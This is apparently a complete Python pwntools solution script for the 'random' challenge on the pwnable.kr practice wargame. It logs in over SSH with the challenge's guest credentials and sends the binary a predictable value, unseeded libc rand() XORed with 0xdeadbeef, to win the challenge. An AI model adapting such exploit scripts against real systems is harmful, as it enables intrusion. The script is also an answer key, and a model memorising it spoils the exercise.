from pwn import *
from ctypes import *


s = ssh(host='pwnable.kr',
        port=2222,
        user='random',
        password='guest')

libc = CDLL("libc.so.6")

sh=s.process('random')
sh.sendline(str(libc.rand()^0xdeadbeef))
print sh.readall()